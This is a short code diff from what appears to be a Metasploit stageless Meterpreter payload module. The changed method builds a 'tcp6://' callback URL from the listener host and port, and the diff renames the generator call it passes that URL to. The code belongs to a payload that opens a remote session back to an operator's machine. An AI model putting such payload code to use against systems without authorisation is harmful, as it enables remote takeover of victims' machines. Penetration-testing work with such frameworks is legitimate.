@@ -37,7 +37,7 @@ module Metasploit3
 
   def generate
     url = "tcp6://#{datastore['LHOST']}:#{datastore['LPORT']}?#{datastore['SCOPEID']}"
-    generate_stageless_meterpreter(url)
+    generate_stageless_x86(url)
   end
 
 end
